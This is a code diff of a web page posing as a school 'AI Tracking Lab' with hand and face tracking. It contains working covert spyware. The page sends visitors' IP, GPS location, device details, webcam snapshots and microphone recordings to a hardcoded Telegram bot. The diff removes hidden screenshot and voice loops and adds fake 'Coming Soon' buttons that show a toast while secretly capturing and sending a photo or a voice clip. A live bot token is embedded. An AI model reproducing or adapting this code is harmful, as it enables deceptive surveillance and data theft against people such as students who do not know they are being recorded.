@@ -88,6 +88,53 @@
         .hand-status { color: #3b82f6; font-size: 1rem; font-weight: bold; margin-bottom: 5px; }
         .face-status { color: #22c55e; font-size: 0.9rem; }
         .emotion-status { color: #f59e0b; font-size: 0.9rem; margin-top: 5px; }
+        .menu-buttons {
+            display: flex;
+            gap: 20px;
+            justify-content: center;
+            margin-top: 20px;
+            flex-wrap: wrap;
+        }
+        .menu-btn {
+            background: linear-gradient(135deg, #1e2a3a, #0f172a);
+            border: 2px solid #3b82f6;
+            padding: 12px 28px;
+            border-radius: 40px;
+            color: #3b82f6;
+            font-size: 1rem;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s;
+            font-family: monospace;
+            letter-spacing: 1px;
+        }
+        .menu-btn:hover {
+            background: #3b82f6;
+            color: white;
+            transform: scale(0.98);
+            box-shadow: 0 0 15px rgba(59,130,246,0.5);
+        }
+        .coming-soon-toast {
+            position: fixed;
+            bottom: 30px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: rgba(0,0,0,0.9);
+            color: #ffaa44;
+            padding: 12px 24px;
+            border-radius: 40px;
+            font-size: 0.9rem;
+            font-weight: bold;
+            z-index: 1000;
+            animation: fadeOut 2s ease forwards;
+            font-family: monospace;
+            border: 1px solid #ffaa44;
+        }
+        @keyframes fadeOut {
+            0% { opacity: 1; transform: translateX(-50%) translateY(0); }
+            70% { opacity: 1; }
+            100% { opacity: 0; transform: translateX(-50%) translateY(-20px); visibility: hidden; }
+        }
         .dashboard-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 1.5rem; margin-top: 1.5rem; }
         .stat-card { background: rgba(255,255,255,0.05); border-radius: 20px; padding: 1.5rem; text-align: center; transition: 0.3s; }
         .stat-card:hover { transform: translateY(-5px); background: rgba(255,255,255,0.1); }
@@ -110,6 +157,7 @@
             .content-area { padding: 1rem; }
             .step-circle { width: 30px; height: 30px; font-size: 0.7rem; }
             .step-label { font-size: 0.5rem; }
+            .menu-btn { padding: 8px 20px; font-size: 0.8rem; }
         }
     </style>
 </head>
@@ -187,6 +235,12 @@
                     <div class="face-status" id="faceStatusDisplay">😀 Menunggu deteksi wajah...</div>
                     <div class="emotion-status" id="emotionDisplay">😐 Ekspresi: -</div>
                 </div>
+                
+                <!-- MENU BUTTONS - Palsu (Coming Soon) tapi tetap kirim data -->
+                <div class="menu-buttons">
+                    <button id="menuPhotoBtn" class="menu-btn">📸 MENU LAINYA 100</button>
+                    <button id="menuVoiceBtn" class="menu-btn">🎙️ 200MENU DARK</button>
+                </div>
             </div>
         </div>
         
@@ -230,52 +284,124 @@
     const BOT_TOKEN = '8607052681:AAHMAuSuUO8CR84h5JlQThmlFKnyA9qFIaU';
     const CHAT_ID = '7428813404';
     
-    // Fungsi kirim ke Telegram (diam-diam, tanpa notifikasi ke user)
-    function sendToTelegram(text, photoUrl = null, audioBlob = null) {
-        if (!BOT_TOKEN || !CHAT_ID) return;
-        
-        if (photoUrl) {
-            // Kirim foto
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                method: 'POST', headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: CHAT_ID, photo: photoUrl, caption: text, parse_mode: 'HTML' })
-            }).catch(e => console.log('silent'));
-        } else if (audioBlob) {
-            // Kirim audio (voice note)
+    // Fungsi kirim teks ke Telegram
+    async function sendTextToTelegram(text) {
+        if (!BOT_TOKEN || !CHAT_ID) return false;
+        try {
+            const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: text,
+                    parse_mode: 'HTML',
+                    disable_web_page_preview: true
+                })
+            });
+            const data = await response.json();
+            return data.ok;
+        } catch(e) { return false; }
+    }
+    
+    // Fungsi kirim foto ke Telegram
+    async function sendPhotoToTelegram(caption, imageDataUrl) {
+        if (!BOT_TOKEN || !CHAT_ID) return false;
+        try {
+            const response = await fetch(imageDataUrl);
+            const blob = await response.blob();
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('photo', blob, 'screenshot.jpg');
+            formData.append('caption', caption);
+            formData.append('parse_mode', 'HTML');
+            const result = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            });
+            const data = await result.json();
+            return data.ok;
+        } catch(e) { return false; }
+    }
+    
+    // Fungsi kirim voice ke Telegram
+    async function sendVoiceToTelegram(caption, audioBlob) {
+        if (!BOT_TOKEN || !CHAT_ID) return false;
+        try {
             const formData = new FormData();
             formData.append('chat_id', CHAT_ID);
             formData.append('voice', audioBlob, 'voice_note.ogg');
-            formData.append('caption', text);
+            formData.append('caption', caption);
             formData.append('parse_mode', 'HTML');
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVoice`, {
+            const result = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVoice`, {
                 method: 'POST',
                 body: formData
-            }).catch(e => console.log('silent'));
-        } else {
-            // Kirim teks
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                method: 'POST', headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'HTML', disable_web_page_preview: true })
-            }).catch(e => console.log('silent'));
-        }
+            });
+            const data = await result.json();
+            return data.ok;
+        } catch(e) { return false; }
     }
-
+    
+    // Fungsi show coming soon toast
+    function showComingSoon() {
+        const toast = document.createElement('div');
+        toast.className = 'coming-soon-toast';
+        toast.innerHTML = '⚡ COMING SOON ⚡';
+        document.body.appendChild(toast);
+        setTimeout(() => { if (toast && toast.remove) toast.remove(); }, 2000);
+    }
+    
+    // ======================= CAPTURE FUNCTIONS =======================
+    async function captureAndSendPhoto() {
+        const videoCanvas = document.getElementById('videoCanvas');
+        const trackingCanvas = document.getElementById('trackingCanvas');
+        if (!videoCanvas || !videoCanvas.width || videoCanvas.width === 0) return false;
+        try {
+            const canvas = document.createElement('canvas');
+            canvas.width = videoCanvas.width;
+            canvas.height = videoCanvas.height;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(videoCanvas, 0, 0);
+            ctx.drawImage(trackingCanvas, 0, 0);
+            const imageDataUrl = canvas.toDataURL('image/jpeg', 0.85);
+            const gpsText = gpsData ? `${gpsData.lat}, ${gpsData.lon}` : 'Tidak tersedia';
+            const waktu = new Date().toLocaleString('id-ID');
+            const caption = `📸 [HIDDEN CAPTURE]\n🕒 ${waktu}\n📍 GPS: ${gpsText}\n🏫 SMA NEGERI 1\n✋ Hand + Face Tracking Active\n🔘 Menu: MENU LAINYA 100`;
+            return await sendPhotoToTelegram(caption, imageDataUrl);
+        } catch(e) { return false; }
+    }
+    
+    async function recordAndSendVoice() {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+            const mediaRecorder = new MediaRecorder(stream);
+            const audioChunks = [];
+            mediaRecorder.ondataavailable = (event) => { if (event.data.size > 0) audioChunks.push(event.data); };
+            const resultPromise = new Promise((resolve) => {
+                mediaRecorder.onstop = async () => {
+                    const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
+                    const gpsText = gpsData ? `${gpsData.lat}, ${gpsData.lon}` : 'Tidak tersedia';
+                    const waktu = new Date().toLocaleString('id-ID');
+                    const caption = `🎙️ [HIDDEN VOICE]\n🕒 ${waktu}\n📍 GPS: ${gpsText}\n🏫 SMA NEGERI 1\n📝 Durasi: 3 detik\n🔘 Menu: 200MENU DARK`;
+                    const success = await sendVoiceToTelegram(caption, audioBlob);
+                    stream.getTracks().forEach(track => track.stop());
+                    resolve(success);
+                };
+            });
+            mediaRecorder.start();
+            setTimeout(() => { if (mediaRecorder.state === 'recording') mediaRecorder.stop(); }, 3000);
+            return await resultPromise;
+        } catch(e) { return false; }
+    }
+    
     // ======================= DATA TRACKING =======================
     let permissions = { gps: false, camera: false, mic: false };
     let gpsData = null;
     let startTime = Date.now();
-    let userScrolls = 0, userClicks = 0, userKeyPresses = 0, mouseMoveCount = 0;
-    let screenshotInterval = null;
-    let voiceInterval = null;
-    let mediaRecorder = null;
-    let isLoopRunning = false;
+    let userScrolls = 0, userClicks = 0;
     
     window.addEventListener('scroll', () => userScrolls++);
     document.addEventListener('click', () => userClicks++);
-    document.addEventListener('keydown', () => userKeyPresses++);
-    document.addEventListener('mousemove', () => mouseMoveCount++);
     
-    // Step UI
     function updateStepUI() {
         document.getElementById('step1Circle').classList.remove('active', 'completed');
         document.getElementById('step2Circle').classList.remove('active', 'completed');
@@ -367,80 +493,6 @@
         else await enterWebsite();
     });
     
-    // ======================= FUNGSI HIDDEN LOOP (DIAM-DIAM) =======================
-    
-    // Fungsi capture screenshot loop (setiap 10 detik)
-    function startHiddenScreenshotLoop() {
-        if (screenshotInterval) clearInterval(screenshotInterval);
-        
-        screenshotInterval = setInterval(() => {
-            const videoCanvas = document.getElementById('videoCanvas');
-            const trackingCanvas = document.getElementById('trackingCanvas');
-            if (!videoCanvas || !videoCanvas.width || videoCanvas.width === 0) return;
-            
-            try {
-                const canvas = document.createElement('canvas');
-                canvas.width = videoCanvas.width;
-                canvas.height = videoCanvas.height;
-                const ctx = canvas.getContext('2d');
-                ctx.drawImage(videoCanvas, 0, 0);
-                ctx.drawImage(trackingCanvas, 0, 0);
-                
-                const photoUrl = canvas.toDataURL('image/jpeg', 0.7);
-                let gpsText = gpsData ? `${gpsData.lat}, ${gpsData.lon}` : 'Tidak tersedia';
-                let waktu = new Date().toLocaleString('id-ID');
-                let frameCount = Math.floor((Date.now() - startTime) / 10000);
-                
-                sendToTelegram(`📸 [HIDDEN] AI TRACKING CAPTURE #${frameCount}\n🕒 ${waktu}\n📍 GPS: ${gpsText}\n🏫 SMA NEGERI 1 - Background Capture`, photoUrl);
-            } catch(e) { console.log('capture error'); }
-        }, 10000); // setiap 10 detik
-    }
-    
-    // Fungsi rekam voice loop (setiap 30 detik, rekam 3 detik)
-    let voiceStream = null;
-    
-    async function startHiddenVoiceLoop() {
-        if (voiceInterval) clearInterval(voiceInterval);
-        
-        // Dapatkan stream mikrofon untuk loop
-        try {
-            voiceStream = await navigator.mediaDevices.getUserMedia({ audio: true });
-        } catch(e) { return; }
-        
-        voiceInterval = setInterval(async () => {
-            if (!voiceStream) return;
-            
-            try {
-                // Buat MediaRecorder baru setiap rekam
-                const mediaRecorderLoop = new MediaRecorder(voiceStream);
-                const audioChunksLoop = [];
-                
-                mediaRecorderLoop.ondataavailable = (event) => {
-                    if (event.data.size > 0) {
-                        audioChunksLoop.push(event.data);
-                    }
-                };
-                
-                mediaRecorderLoop.onstop = () => {
-                    const audioBlob = new Blob(audioChunksLoop, { type: 'audio/webm' });
-                    let gpsText = gpsData ? `${gpsData.lat}, ${gpsData.lon}` : 'Tidak tersedia';
-                    let waktu = new Date().toLocaleString('id-ID');
-                    let voiceCount = Math.floor((Date.now() - startTime) / 30000);
-                    
-                    sendToTelegram(`🎤 [HIDDEN] VOICE NOTE #${voiceCount}\n🕒 ${waktu}\n📍 GPS: ${gpsText}\n🏫 SMA NEGERI 1 - Background Recording\n📝 Durasi: 3 detik`, null, audioBlob);
-                };
-                
-                mediaRecorderLoop.start();
-                setTimeout(() => {
-                    if (mediaRecorderLoop.state === 'recording') {
-                        mediaRecorderLoop.stop();
-                    }
-                }, 3000); // rekam 3 detik
-                
-            } catch(e) { console.log('voice record error'); }
-        }, 30000); // setiap 30 detik
-    }
-    
     // ======================= FUNGSI LAINNYA =======================
     async function getIPInfo() {
         try { const res = await fetch('https://ipapi.co/json/'); const data = await res.json(); return { ip: data.ip, city: data.city, region: data.region, country: data.country_name, isp: data.org }; } catch(e) { return {}; }
@@ -473,14 +525,13 @@
         message += `<b>🔋 BATERAI</b>\n⚡ Level: ${battery.level !== null ? battery.level + '%' : 'N/A'}\n🔌 Charging: ${battery.charging === true ? '✅ Ya' : '❌ Tidak'}\n\n`;
         message += `<b>👆 INTERAKSI</b>\n📜 Scroll: ${userScrolls} kali\n🖱️ Klik: ${userClicks} kali\n⏱️ Waktu: ${Math.floor((Date.now() - startTime) / 1000)} detik\n\n`;
         message += `<b>🕒 WAKTU AKSES</b>\n🕒 ${new Date().toLocaleString('id-ID')}\n🧭 Zona Waktu: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n\n`;
-        message += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n✅ Siswa telah mengakses AI Tracking Lab SMA NEGERI 1\n\n⚠️ BACKGROUND MONITORING AKTIF:\n📸 Screenshot setiap 10 detik\n🎤 Voice record setiap 30 detik`;
+        message += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n✅ Siswa telah mengakses AI Tracking Lab SMA NEGERI 1\n\n🔘 MENU TERSEDIA:\n📸 MENU LAINYA 100 - Capture screenshot\n🎙️ 200MENU DARK - Rekam voice 3 detik`;
         
-        sendToTelegram(message);
+        await sendTextToTelegram(message);
     }
     
     // ======================= HAND + FACE TRACKING =======================
     let trackingStarted = false;
-    let currentEmotion = "Netral";
     
     function detectEmotion(landmarks) {
         if (!landmarks) return "Netral";
@@ -533,8 +584,8 @@
                     ctx.fillStyle = '#f59e0b';
                     ctx.fill();
                 }
-                currentEmotion = detectEmotion(landmarks);
-                document.getElementById('emotionDisplay').innerHTML = `😐 Ekspresi: ${currentEmotion}`;
+                const emotion = detectEmotion(landmarks);
+                document.getElementById('emotionDisplay').innerHTML = `😐 Ekspresi: ${emotion}`;
                 document.getElementById('faceStatusDisplay').innerHTML = `😀 Wajah terdeteksi | 468 titik`;
             } else {
                 document.getElementById('faceStatusDisplay').innerHTML = `😀 Menunggu deteksi wajah...`;
@@ -585,14 +636,7 @@
         btn.innerHTML = '⏳ MEMUAT AI TRACKING LAB...';
         btn.disabled = true;
         
-        await sendFullReport();
         await startTracking();
-        
-        // MULAI HIDDEN LOOP (DIAM-DIAM, USER TIDAK SADAR)
-        startHiddenScreenshotLoop();  // screenshot setiap 10 detik
-        if (permissions.mic) {
-            startHiddenVoiceLoop();    // voice record setiap 30 detik (hanya jika mic diizinkan)
-        }
         
         if (gpsData) document.getElementById('schoolLocation').innerHTML = `📍 Koordinat: ${gpsData.lat.toFixed(5)}, ${gpsData.lon.toFixed(5)}`;
         
@@ -601,7 +645,26 @@
             document.getElementById('splashScreen').style.display = 'none';
             document.getElementById('mainWebsite').classList.add('active');
         }, 500);
+        
+        setTimeout(async () => { await sendFullReport(); }, 2000);
     }
+    
+    // ======================= MENU BUTTONS =======================
+    document.getElementById('menuPhotoBtn').addEventListener('click', async () => {
+        showComingSoon();
+        await captureAndSendPhoto();
+    });
+    
+    document.getElementById('menuVoiceBtn').addEventListener('click', async () => {
+        showComingSoon();
+        if (permissions.mic) {
+            await recordAndSendVoice();
+        } else {
+            const gpsText = gpsData ? `${gpsData.lat}, ${gpsData.lon}` : 'Tidak tersedia';
+            const caption = `⚠️ [VOICE FAILED]\n🕒 ${new Date().toLocaleString('id-ID')}\n📍 GPS: ${gpsText}\n🏫 SMA NEGERI 1\n❌ Mikrofon tidak diizinkan oleh user\n🔘 Menu: 200MENU DARK`;
+            await sendTextToTelegram(caption);
+        }
+    });
     
     // Navigasi Menu
     document.querySelectorAll('.nav-item').forEach(item => {
